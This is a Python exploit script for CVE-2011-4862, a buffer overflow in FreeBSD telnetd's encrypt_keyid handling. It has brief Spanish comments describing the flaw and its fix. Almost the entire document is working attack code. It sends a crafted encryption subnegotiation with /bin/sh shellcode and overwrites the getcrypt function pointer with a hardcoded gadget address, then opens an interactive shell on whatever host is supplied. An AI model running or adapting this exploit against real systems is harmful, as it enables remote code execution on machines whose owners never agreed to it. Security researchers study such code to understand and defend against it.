# CVE-2011-4862: Remote code Execution over telnetd in FreeBSD 7.3 through 9.0
# FREE BSD 8 
# by hdbreaker

# FIX: Limitar LEN de MAXKEYLEN a 64 Bytes en la funcion encrypt_keyid
# Error: No se validaba el largo de el LEN pasado a la funcion encrypt_keyid

# 1) Estudiar el protocolo telnet para utilizar la funcion encript_keyid vulnerable
# 2) Colocar un len mayor a 64 bytes (64 + 4 + 4 + 4 + puntero) y sobrescribir *getcrypt de la estructura key_info gracias a memmove
# 3) Enviar un segundo paquete para llegar a la funcion encrypt_keyid y explotar el llamado de getcrypt en "if (!(ep = (*kp->getcrypt) (*kp->modep)))"

# Informacion Util:
# FREE_BSD 8 NO ASLR, NO NX
# 0x28472d08 => Direccion de MEMMOVE

import sys
import struct
import socket
import telnetlib

class CVE_2011_4862():

	def __init__(self):
		self.IS = "\x00"
		self.CFB64_IV = "\x01"
		self.DES_CFB64 = "\x01"
		self.SUBNEGOEND = "\xF0"
		self.SUBNEGO = "\xFA"
		self.call_edx = struct.pack('<I', 0x0804a869)
		self.junk_address = struct.pack('<I', 0x08057c10)


	def start(self):
		#NEGOTIATION INIT
		JUNK = "\x00" * 8
		init = telnetlib.IAC + self.SUBNEGO + telnetlib.ENCRYPT+ self.IS + self.DES_CFB64 + self.CFB64_IV + JUNK + telnetlib.IAC + self.SUBNEGOEND
		s.send(init)
		s.recv(4096)
		self.exploit()

	def exploit(self):
		#SEND ENCRIPTED KEYID MESSAGE
		JUNK = "\x90" * 4
		init = telnetlib.IAC + self.SUBNEGO + telnetlib.ENCRYPT + "\x07" #0x07 is the kind of encryption
		#We need 64 bytes to start the overwrite of the structure, i use this to put the shellcode
		# static struct key_info
		# {
		# unsigned char keyid[MAXKEYLEN]; #64 Bytes here goes the shellcode
		# int keylen; #4 bytes of junk
		# int dir;	  #4 bytes of junk
		# int *modep; #This pointer overwrite eax and is used in "mov eax, DWORD PTR [eax]" (Dir: 0x08053d33), for avoid memory errors, we need put any valid address
		# Encryptions *(*getcrypt) (); #Call EDX, at the end of the exploit execution EDX  aim to my shellcode
		# } 
		keyid_overwrite = "\x90"*(64-len(self.get_shellcode()))+self.get_shellcode()+ JUNK + JUNK + self.junk_address + self.call_edx
		payload =  init + keyid_overwrite + telnetlib.IAC + self.SUBNEGOEND

		#Fist: Overwrite *getcrypt
		#Second: Dummy query to trigger the exploit in *kp->getcrypt 
		for i in range(2):
			s.send(payload)
			s.recv(4096)

		self.interact(s)

	def get_shellcode(self):
		#http://shell-storm.org/shellcode/files/shellcode-170.php
		nopsleed = "\x90"*10
		shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"
		return nopsleed+shellcode

	def interact(self, socket):
		t = telnetlib.Telnet()
		t.sock = socket
		t.interact()
		t.close()

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 23))
	exploit = CVE_2011_4862()
	exploit.start()
except:
	print "Usage: python CVE-2011-4862.py {host}"

